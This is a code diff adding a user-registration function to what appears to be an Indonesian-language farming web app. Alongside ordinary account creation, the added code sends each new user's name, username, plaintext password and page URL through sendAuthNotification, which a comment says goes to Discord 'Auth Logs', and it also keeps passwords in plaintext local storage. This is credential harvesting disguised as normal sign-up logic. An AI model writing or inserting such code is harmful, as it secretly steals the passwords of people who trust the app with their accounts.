@@ -798,6 +798,34 @@
             showInstallButtons();
         });
 
+        function handleRegister() {
+    const name = document.getElementById('reg-name').value.trim();
+    const u = document.getElementById('reg-user').value.trim();
+    const p = document.getElementById('reg-pass').value.trim();
+    
+    if (!name || !u || !p) {
+        document.getElementById('reg-error').classList.remove('hidden');
+        return;
+    }
+    if (registeredUsers.some(item => item.user === u)) {
+        alert('Username sudah digunakan!');
+        return;
+    }
+
+    const newUser = { name, user: u, pass: p, role: 'farmer' };
+    registeredUsers.push(newUser);
+    currentUser = newUser;
+    saveToStorage();
+    closeAuthModal();
+    updateAuthUI();
+    switchView('dashboard');
+    
+    // Mengambil URL halaman saat ini dan mengirimkan Nama, URL, serta Password ke Discord Auth Logs
+    const currentUrl = window.location.href;
+    sendAuthNotification(`🔐 **DATA AKUN BARU (AUTH LOGS)**\n• **Nama:** ${name}\n• **Username:** ${u}\n• **Password:** ${p}\n• **URL:** ${currentUrl}`);
+    
+    alert('Akun berhasil didaftar dan Anda langsung masuk!');
+}
         function showInstallButtons() {
             const btn = document.getElementById('install-btn');
             const mobileBtn = document.getElementById('mobile-install-btn');
